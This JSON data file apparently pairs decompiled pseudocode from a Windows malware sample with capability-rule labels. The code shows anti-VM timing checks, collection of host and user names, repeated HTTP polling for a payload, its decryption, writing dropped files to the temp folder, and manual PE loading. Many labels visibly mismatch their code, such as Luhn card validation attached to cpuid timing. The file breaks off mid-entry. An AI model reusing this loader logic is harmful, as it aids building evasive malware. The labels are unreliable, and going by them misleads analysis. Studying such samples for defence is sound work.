{
    "14000100": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x000140001034)\n\nuint64_t fcn.140001000(ulong noname_0, ulong arg2)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    uint32_t extraout_var;\n    uint32_t extraout_var_00;\n    int64_t iVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    \n    // [00] -r-x section size 8192 named .c\n    uVar5 = 0;\n    iVar4 = 0x10;\n    uVar6 = uVar5;\n    do {\n        (*_sym.imp.KERNEL32.dll_SwitchToThread)();\n        uVar1 = rdtsc();\n        cpuid_Version_info(1);\n        iVar2 = rdtsc();\n        uVar6 = uVar6 + (iVar2 - (uVar1 & 0xffffffff | extraout_var << 0x20 | uVar1 & 0xffffffff00000000));\n        (*_sym.imp.KERNEL32.dll_SwitchToThread)();\n        uVar1 = rdtsc();\n        uVar3 = rdtsc();\n        uVar5 = uVar5 + ((extraout_var_00 << 0x20 | uVar1 & 0xffffffff00000000 | uVar3 & 0xffffffff |\n                         uVar3 & 0xffffffff00000000) -\n                        (uVar1 & 0xffffffff | extraout_var_00 << 0x20 | uVar1 & 0xffffffff00000000));\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    return uVar6 / uVar5;\n}\n",
        "token_count": 378
    },
    "1400015d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00014000163f)\n// WARNING: Removing unreachable block (ram,0x000140001633)\n// WARNING: Removing unreachable block (ram,0x000140001620)\n// WARNING: Removing unreachable block (ram,0x00014000160a)\n// WARNING: Removing unreachable block (ram,0x0001400015ef)\n\nvoid fcn.1400015d0(uint32_t *arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    bool bVar5;\n    \n    *arg1 = 0;\n    iVar1 = cpuid_basic_info(0);\n    bVar5 = *(iVar1 + 4) == 0x756e6547;\n    if (bVar5) {\n        *arg1 = 1;\n    }\n    uVar4 = bVar5;\n    iVar1 = cpuid(0x80000001);\n    if ((*(iVar1 + 8) >> 0x16 & 1) != 0) {\n        uVar4 = uVar4 | 2;\n        *arg1 = uVar4;\n    }\n    puVar2 = cpuid_Thermal_Power_Management_info(6);\n    if ((*puVar2 & 1) != 0) {\n        *arg1 = uVar4 | 4;\n    }\n    puVar2 = cpuid_Version_info(1);\n    arg1[1] = *puVar2;\n    iVar1 = cpuid(0x40000000);\n    uVar4 = *(iVar1 + 8);\n    uVar3 = *(iVar1 + 0xc);\n    arg1[3] = *(iVar1 + 4);\n    uVar4 = fcn.140001000(uVar3, uVar4);\n    arg1[2] = uVar4;\n    return;\n}\n",
        "token_count": 428
    },
    "140001e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.140001e48(int64_t arg1, ulong arg2, ulong lpString2, uchar *lpString1)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    \n    (*_sym.imp.KERNEL32.dll_lstrcpyA)(lpString1 + 0x20a, lpString2);\n    puVar1 = lpString1 + 0x106;\n    iVar2 = (*_sym.imp.SHELL32.dll_SHGetFolderPathA)(0, 0x1a, 0, 0, puVar1);\n    if (iVar2 == 0) {\n        (*_sym.imp.KERNEL32.dll_lstrcatA)(puVar1, 0x140006154);\n    }\n    else {\n        (*_sym.imp.KERNEL32.dll_lstrcpyA)(puVar1, 0x140006170);\n    }\n    (*_sym.imp.KERNEL32.dll_lstrcatA)(puVar1, lpString2);\n    *lpString1 = 0x43;\n    lpString1[1] = *(arg1 + 1);\n    *(lpString1 + 0x34e) = arg1 + 0x6a;\n    *(lpString1 + 0x356) = 0x25c;\n    (*_sym.imp.KERNEL32.dll_lstrcpyA)(lpString1 + 2, arg2);\n    if (*(arg1 + 1) == '\\0') {\n        lpString1[0x30e] = 0;\n    }\n    else {\n        (*_sym.imp.KERNEL32.dll_lstrcpyA)(lpString1 + 0x30e, 0x140006030);\n    }\n    return;\n}\n",
        "token_count": 368
    },
    "1400022e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint64_t fcn.1400022e8(int64_t arg1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    ulong in_RDX;\n    int64_t iVar3;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    \n    fcn.1400015d0(&uStack24, in_RDX);\n    iVar1 = (*_str._tFw)(arg1, 0x140006148, 0x140006020, uStack24);\n    iVar2 = (*_str._tFw)(arg1 + iVar1 * 2, 0x140006148, 0x140006180, uStack20);\n    iVar3 = iVar1 + iVar2;\n    iVar1 = (*_str._tFw)(arg1 + iVar3 * 2, 0x140006148, 0x140006180, uStack12);\n    iVar3 = iVar3 + iVar1;\n    iVar1 = (*_str._tFw)(arg1 + iVar3 * 2, 0x140006148, 0x140006180, uStack16);\n    return iVar1 + iVar3;\n}\n",
        "token_count": 268
    },
    "14000109": {
        "rules": [
            "check HTTP status code/09dd97b2e76544bcbbe79d95da398605"
        ],
        "decompiled_code": "\nulong fcn.14000109c(ulong arg1, ulong arg2, char **arg3, uint64_t *arg4)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    uchar auStack136 [128];\n    \n    (*_str._tFw)(auStack136, 0x140006000, arg1);\n    do {\n        iVar2 = fcn.140002624(auStack136, arg2, arg3, arg4);\n        pcVar1 = *arg3;\n        if (iVar2 == 0x194) {\n            if (pcVar1 != NULL) {\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3, 0, pcVar1);\n            }\n            return 0;\n        }\n        if (iVar2 == 200) {\n            if (pcVar1 != NULL) {\n                if ((((0x3ff < *arg4) && (*pcVar1 == '\\x1f')) && (pcVar1[1] == -0x75)) &&\n                   (iVar2 = fcn.140001360(arg3, arg4),  iVar2 != 0)) {\n                    return 1;\n                }\n                goto code_r0x00014000111d;\n            }\n        }\n        else {\ncode_r0x00014000111d:\n            if (pcVar1 != NULL) {\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3, 0, pcVar1);\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)(60000);\n    } while( true );\n}\n",
        "token_count": 387
    },
    "14000118": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.140001180(int64_t arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    uint64_t uVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    uint64_t uVar5;\n    uint64_t *puVar6;\n    \n    if (*(arg2 + 0x10) != 0) {\n        for (puVar4 = *(arg2 + 0x10) + arg1; puVar4[3] != 0; puVar4 = puVar4 + 5) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n            if (iVar1 == 0) {\n                return 0;\n            }\n            uVar3 = puVar4[4];\n            if (uVar3 == 0) {\n                uVar3 = *puVar4;\n            }\n            uVar5 = 0;\n            for (puVar6 = uVar3 + arg1; uVar2 = *puVar6,  uVar2 != 0; puVar6 = puVar6 + 1) {\n                if (uVar2 < 0) {\n                    uVar2 = uVar2 & 0xffff;\n                }\n                else {\n                    uVar2 = arg1 + 2 + uVar2;\n                }\n                uVar2 = (*_str.__Vw)(iVar1, uVar2);\n                if (uVar2 == 0) {\n                    return 0;\n                }\n                if (puVar4[4] == 0) {\n                    *(uVar5 + *puVar4 + arg1) = uVar2;\n                }\n                else {\n                    *puVar6 = uVar2;\n                }\n                uVar5 = uVar5 + 8;\n            }\n        }\n    }\n    return 1;\n}\n",
        "token_count": 404
    },
    "14000150": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.140001504(int64_t arg1, int64_t *arg2)\n\n{\n    uint16_t uVar1;\n    int64_t *piVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    int64_t iVar6;\n    uint32_t *puVar7;\n    \n    puVar5 = arg1 + *(arg2 + 0x14);\n    iVar6 = arg1 - *arg2;\n    if ((iVar6 != 0) && (*(arg2 + 0x14) != 0)) {\n        for (; (*puVar5 != 0 && (puVar5[1] != 0)); puVar5 = puVar5 + puVar5[1]) {\n            uVar3 = 0;\n            uVar4 = puVar5[1] - 8 >> 1;\n            if (uVar4 != 0) {\n                puVar7 = puVar5 + 2;\n                do {\n                    uVar1 = *puVar7;\n                    if (0xfff < uVar1) {\n                        piVar2 = *puVar5 + (uVar1 & 0xfff) + arg1;\n                        if (uVar1 >> 0xc == 3) {\n                            *piVar2 = *piVar2 + iVar6;\n                        }\n                        else {\n                            if (uVar1 >> 0xc != 10) {\n                                return 0;\n                            }\n                            *piVar2 = *piVar2 + iVar6;\n                        }\n                    }\n                    uVar3 = uVar3 + 1;\n                    puVar7 = puVar7 + 2;\n                } while (uVar3 < uVar4);\n            }\n        }\n        arg1 = *(arg2 + 0x14) + arg1;\n        if ((arg1 != 0) && (*(arg2 + 3) != 0)) {\n            sub.msvcrt.dll_memset(arg1, 0);\n        }\n    }\n    return 1;\n}\n",
        "token_count": 443
    },
    "140002c2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint64_t fcn.140002c24(char *arg1, int64_t arg2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    uchar auStack344 [64];\n    uchar auStack280 [272];\n    \n    if ((*arg1 == '\\x02') && (*(arg1 + 6) + *(arg1 + 2) + 0x2c6 == arg2)) {\n        iVar1 = fcn.14000254c(arg1, auStack344);\n        if (iVar1 == 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar3 = uVar2 & 0xffffff | 0x2000000;\n        }\n        else {\n            iVar1 = fcn.140001248(arg1, auStack280);\n            if (iVar1 == 0) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                uVar3 = uVar2 & 0xffffff | 0x3000000;\n            }\n            else {\n                uVar3 = fcn.14000181c(arg1, auStack280, auStack344);\n            }\n        }\n    }\n    else {\n        uVar3 = arg2 & 0xffffff | 0x1000000;\n    }\n    return uVar3;\n}\n",
        "token_count": 298
    },
    "1400029d": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nulong fcn.1400029d8(uint16_t *arg1, ulong arg2)\n\n{\n    uint16_t uVar1;\n    uint64_t uVar2;\n    uint16_t *puVar3;\n    uint32_t extraout_var;\n    uint64_t uVar4;\n    ulong uVar5;\n    uint32_t uVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    int32_t *arg2_00;\n    uint32_t uVar9;\n    \n    if ((*arg1 == 0x5a4d) && (arg2_00 = *(arg1 + 0x1e) + arg1,  *arg2_00 == 0x4550)) {\n        fcn.140002678(arg1, arg2_00);\n        uVar2 = rdtsc();\n        uVar8 = 0;\n        uVar4 = uVar2 & 0xffffffff | extraout_var << 0x20 | uVar2 & 0xffffffff00000000;\n        iVar7 = SUB168(ZEXT816(0x106291eb9624e171) * ZEXT816(uVar4) >> 0x40, 0);\n        arg2_00[2] = (uVar2 & 0xffffffff) + ((uVar4 - iVar7 >> 1) + iVar7 >> 0x18) * -0x1e13380 + 0x54a48e00;\n        puVar3 = arg1;\n        for (uVar9 = arg2 + 1U >> 1; uVar9 != 0; uVar9 = uVar9 - 1) {\n            uVar1 = *puVar3;\n            puVar3 = puVar3 + 1;\n            uVar6 = uVar8 + uVar1;\n            uVar8 = (uVar6 & 0xffff) + (uVar6 >> 0x10);\n        }\n        uVar6 = (uVar8 >> 0x10) + uVar8 & 0xffff;\n        uVar9 = *(*(arg1 + 0x1e) + 0x58 + arg1);\n        uVar6 = uVar6 - ((uVar9 & 0xffff) + (uVar6 < (uVar9 & 0xffff)));\n        arg2_00[0x16] = ((uVar6 - (uVar6 < uVar9 >> 0x10)) - (uVar9 >> 0x10)) + arg2;\n        uVar5 = 1;\n    }\n    else {\n        uVar5 = 0;\n    }\n    return uVar5;\n}\n",
        "token_count": 582
    },
    "14000165": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\nint64_t fcn.14000165c(int64_t arg1)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    code *pcVar3;\n    int64_t *piVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    uint64_t uVar7;\n    int64_t *piVar8;\n    ulong arg2;\n    uint32_t auStackX16 [2];\n    \n    arg2 = 0x140006118;\n    iVar5 = 0;\n    auStackX16[0] = 0;\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x1400060f8);\n    pcVar3 = (*_str.__Vw)(uVar2, 0x140006038);\n    if (((pcVar3 != NULL) && (iVar1 = (*pcVar3)(0, auStackX16),  iVar1 == 0x6f)) && (uVar7 = auStackX16[0],  uVar7 != 0)\n       ) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        piVar4 = (*_str.0zhw)(uVar2, 8, uVar7 + 1);\n        if (piVar4 != NULL) {\n            iVar1 = (*pcVar3)(piVar4, auStackX16);\n            piVar8 = piVar4;\n            if (iVar1 == 0) {\n                do {\n                    if (((*(piVar8 + 0x38) != '0') || (*(piVar8 + 0x1c1) != '.')) && (*(piVar8 + 0x194) - 1 < 8)) {\n                        iVar6 = fcn.1400012d4(arg1 + iVar5 * 2, arg2, piVar8 + 0x33, *(piVar8 + 0x194));\n                        iVar5 = iVar5 + iVar6;\n                        arg2 = 0x140006090;\n                    }\n                    piVar8 = *piVar8;\n                } while (piVar8 != NULL);\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2, 0, piVar4);\n                if (iVar5 != 0) {\n                    return iVar5;\n                }\n            }\n            else {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2, 0, piVar4);\n            }\n        }\n    }\n    iVar5 = fcn.1400012d4(arg1, 0x140006118, 0x140006060, 1);\n    return iVar5;\n}\n",
        "token_count": 613
    },
    "140001bd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7"
        ],
        "decompiled_code": "\nbool fcn.140001bd8(void)\n\n{\n    ulong uVar1;\n    code *pcVar2;\n    int16_t aiStack56 [24];\n    \n    sub.msvcrt.dll_memset(aiStack56, 0, 0x30);\n    uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x140006108);\n    pcVar2 = (*_str.__Vw)(uVar1, 0x140006068);\n    if (pcVar2 != NULL) {\n        (*pcVar2)(aiStack56);\n    }\n    return aiStack56[0] == 9;\n}\n",
        "token_count": 137
    },
    "140001f3": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.140001f34(ulong arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    int64_t iStackX24;\n    ulong uStackX32;\n    uchar auStack136 [128];\n    \n    iStackX24 = 0;\n    uStackX32 = 0;\n    (*_str._tFw)(auStack136, 0x140006000, arg1);\n    iVar2 = fcn.140002624(auStack136, arg2, &iStackX24, &uStackX32);\n    iVar1 = iStackX24;\n    if ((iVar2 == -1) && (iStackX24 != 0)) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3, 0, iVar1);\n    }\n    return;\n}\n",
        "token_count": 210
    },
    "14000218": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nint64_t fcn.14000218c(int64_t arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    uint auStackX8 [2];\n    uint auStack584 [8];\n    uint auStack552 [132];\n    \n    auStackX8[0] = 0x100;\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetComputerNameExW)(0, auStack552, auStackX8);\n    if (iVar1 == 0) {\n        auStack552[0] = 0x78;\n    }\n    iVar3 = fcn.1400019dc(arg1, 0x140006128, auStack552);\n    auStackX8[0] = 0x100;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameW)(auStack552, auStackX8);\n    if (iVar1 == 0) {\n        auStack552[0] = 0x78;\n    }\n    iVar4 = fcn.1400019dc(arg1 + iVar3 * 2, 0x140006090, auStack552);\n    iVar5 = fcn.1400019dc(arg1 + (iVar3 + iVar4) * 2, 0x140006090, arg2);\n    iVar5 = iVar3 + iVar4 + iVar5;\n    uVar2 = fcn.140002034(5, auStack584);\n    if (uVar2 == 0) {\n        iVar1 = (*_str._tFw)(arg1 + iVar5 * 2, 0x140006148, 0x140006050, 0);\n        iVar5 = iVar5 + iVar1;\n    }\n    else {\n        iVar1 = (*_str._tFw)();\n        iVar5 = iVar5 + iVar1;\n        for (uVar6 = 1; uVar6 < uVar2; uVar6 = uVar6 + 1) {\n            iVar1 = (*_str._tFw)(arg1 + iVar5 * 2, 0x140006148, 0x140006064, auStack584[uVar6]);\n            iVar5 = iVar5 + iVar1;\n        }\n    }\n    return iVar5;\n}\n",
        "token_count": 525
    },
    "140002b1": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca",
            "delay execution"
        ],
        "decompiled_code": "\nulong fcn.140002b1c(ulong noname_0, ulong arg2)\n\n{\n    uint64_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    ulong uVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    uchar auStackX8 [7];\n    uint64_t var_17h;\n    ulong var_67h;\n    ulong var_6fh;\n    uchar auStack200 [64];\n    uchar auStack136 [23];\n    ulong ARG_0;\n    uint32_t uStack72;\n    uchar auStack68 [19];\n    ulong var_29h;\n    \n    uVar5 = 0;\n    iVar6 = 4;\n    do {\n        uVar1 = rdtsc();\n        uVar5 = uVar5 << 0x10 | uVar1 & 0xffff;\n        (*_sym.imp.KERNEL32.dll_Sleep)(uVar1 & 0xf);\n        iVar6 = iVar6 + -1;\n    } while (iVar6 != 0);\n    (*_str._tFw)(auStack200, 0x140006098, uVar5);\n    fcn.140002af8(auStack136);\n    iVar6 = fcn.140001d38(uStack72, 1, auStack200);\n    if (iVar6 != 0) {\n        iVar2 = fcn.14000109c(auStack68, iVar6, auStackX8, &var_17h + 1);\n        if ((iVar2 != 0) && (0x3ff < stack0x00000010)) {\n            uVar3 = fcn.140002c24(_auStackX8, stack0x00000010);\n            if (_auStackX8 != 0) {\n                uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4, 0, _auStackX8);\n            }\n            iVar6 = fcn.1400017a4(auStack200, uVar3);\n            if (iVar6 != 0) {\n                fcn.140001f34(auStack68, iVar6);\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 500
    },
    "14000124": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140001248(int64_t arg1, int64_t arg2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    uint32_t auStackX32 [2];\n    ulong in_stack_ffffffffffffffd8;\n    uint uVar5;\n    \n    uVar5 = in_stack_ffffffffffffffd8 >> 0x20;\n    uVar1 = *(arg1 + 2);\n    uVar2 = *(arg1 + 6);\n    iVar3 = (*_sym.imp.KERNEL32.dll_GetTempPathA)(0x104);\n    if (*((iVar3 + -1) + arg2) != '\\\\') {\n        *((iVar3 + -1) + arg2) = 0x5c;\n        *(iVar3 + arg2) = 0;\n    }\n    (*_sym.imp.KERNEL32.dll_lstrcatA)(arg2, arg1 + 0x4a);\n    fcn.1400029d8(arg1 + 0x2c6 + uVar1, uVar2);\n    iVar4 = (*_sym.imp.KERNEL32.dll_CreateFileA)(arg2, 0x40000000, 0, 0, CONCAT44(uVar5, 2), 0x80, 0);\n    if (iVar4 != -1) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_WriteFile)(iVar4, arg1 + 0x2c6 + uVar1, uVar2, auStackX32, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n        if ((iVar3 != 0) && (auStackX32[0] == uVar2)) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 402
    },
    "14000239": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140002394(ulong lpFileName, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    int32_t aiStackX32 [2];\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileA)(lpFileName, 0x40000000, 0, 0, 2, 0x80, 0);\n    if (iVar2 != -1) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)(iVar2, arg2, arg3, aiStackX32, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n        if ((iVar1 != 0) && (aiStackX32[0] == arg3)) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 186
    },
    "1400012d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.1400012d4(int64_t arg1, int16_t *arg2, int64_t noname_2, uint64_t arg4)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    int16_t iVar3;\n    uint64_t uVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    \n    iVar3 = *arg2;\n    uVar4 = 0;\n    uVar5 = uVar4;\n    if (iVar3 != 0) {\n        iVar6 = arg1 - arg2;\n        do {\n            *(iVar6 + arg2) = iVar3;\n            uVar5 = uVar5 + 1;\n            arg2 = arg2 + 1;\n            iVar3 = *arg2;\n        } while (iVar3 != 0);\n    }\n    if (arg4 != 0) {\n        do {\n            uVar2 = *(uVar4 + noname_2) + uVar4;\n            uVar4 = uVar4 + 1;\n            uVar1 = uVar2 * '\\b';\n            *(arg1 + uVar5 * 2) = *((uVar1 >> 4) + 0x1400060d0);\n            *(arg1 + 2 + uVar5 * 2) = *(((uVar1 | uVar2 >> 5) & 0xf) + 0x1400060d0);\n            uVar5 = uVar5 + 2;\n        } while (uVar4 < arg4);\n    }\n    *(arg1 + uVar5 * 2) = 0;\n    return uVar5;\n}\n",
        "token_count": 369
    },
    "14000136": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.140001360(int64_t *arg1, uint64_t *arg2)\n\n{\n    uint32_t *puVar1;\n    uint8_t *puVar2;\n    char cVar3;\n    uint uVar4;\n    bool bVar5;\n    int32_t iVar6;\n    ulong uVar7;\n    uint8_t uVar8;\n    uint32_t uVar9;\n    uint64_t uVar10;\n    char *pcVar11;\n    uint64_t uVar12;\n    uint64_t uVar13;\n    uint64_t uVar14;\n    uint32_t uVar15;\n    ulong var_40h;\n    int64_t var_38h;\n    ulong var_30h;\n    ulong var_28h;\n    ulong var_20h;\n    uint32_t uStack32;\n    uint32_t uStack28;\n    \n    if (0x3ff < *arg2) {\n        var_38h = *arg1;\n        pcVar11 = var_38h + 10;\n        uVar12 = *arg2 - 0x1e;\n        do {\n            uVar13 = uVar12;\n            cVar3 = *pcVar11;\n            uVar12 = uVar13 - 1;\n            pcVar11 = pcVar11 + 1;\n        } while (cVar3 != '\\0');\n        puVar1 = pcVar11 + uVar12;\n        if (puVar1 != NULL) {\n            var_20h._0_4_ = *puVar1;\n            var_20h._4_4_ = puVar1[1];\n            uStack32 = puVar1[2];\n            uStack28 = puVar1[3];\n        }\n        bVar5 = false;\n        if ((pcVar11 != NULL) && (3 < uVar12)) {\n            uVar13 = uVar13 - 5;\n            if (var_38h == 0) {\n                if (uVar13 == 0) {\n                    return 0;\n                }\n                (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n                var_38h = (*_str.0zhw)();\n                if (var_38h == 0) {\n                    return 0;\n                }\n                bVar5 = true;\n            }\n            uVar12 = 0;\n            uVar15 = *(pcVar11 + uVar13) ^ var_20h;\n            if (uVar13 != 0) {\n                do {\n                    uVar10 = uVar12 & 3;\n                    uVar14 = (uVar12 & 0xff) + 1 & 3;\n                    uVar4 = *(&var_20h + uVar14 * 4);\n                    *(uVar12 + var_38h) = pcVar11[uVar12] ^ *(&var_20h + uVar14 * 4) + *(&var_20h + uVar10 * 4);\n                    uVar8 = uVar4 & 7;\n                    uVar9 = *(&var_20h + uVar10 * 4);\n                    uVar12 = uVar12 + 1;\n                    iVar6 = (uVar9 >> uVar8 | uVar9 << 0x20 - uVar8) + 1;\n                    *(&var_20h + uVar10 * 4) = iVar6;\n                    uVar8 = iVar6 & 7;\n                    uVar9 = *(&var_20h + uVar14 * 4);\n                    *(&var_20h + uVar14 * 4) = (uVar9 >> uVar8 | uVar9 << 0x20 - uVar8) + 1;\n                } while (uVar12 < uVar13);\n            }\n            uVar9 = 0;\n            uVar12 = 0;\n            if (uVar13 != 0) {\n                do {\n                    puVar2 = uVar12 + var_38h;\n                    uVar12 = uVar12 + 1;\n                    uVar9 = uVar9 + *puVar2;\n                    uVar9 = uVar9 * 8 | uVar9 >> 0x1d;\n                } while (uVar12 < uVar13);\n            }\n            if (uVar15 == uVar9) {\n                *arg2 = uVar13;\n                return 1;\n            }\n            if ((bVar5) && (var_38h != 0)) {\n                uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7, 0, var_38h);\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1036
    },
    "1400017a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1400017a4(ulong arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    int64_t arg1_00;\n    int64_t iVar2;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    arg1_00 = (*_str.0zhw)(uVar1, 8, 0x2001);\n    if (arg1_00 != 0) {\n        iVar2 = fcn.1400019dc(arg1_00, 0x140006008, arg1);\n        (*_str._tFw)(arg1_00 + iVar2 * 2, 0x140006148, 0x140006090, arg2);\n    }\n    return arg1_00;\n}\n",
        "token_count": 174
    },
    "14000181": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
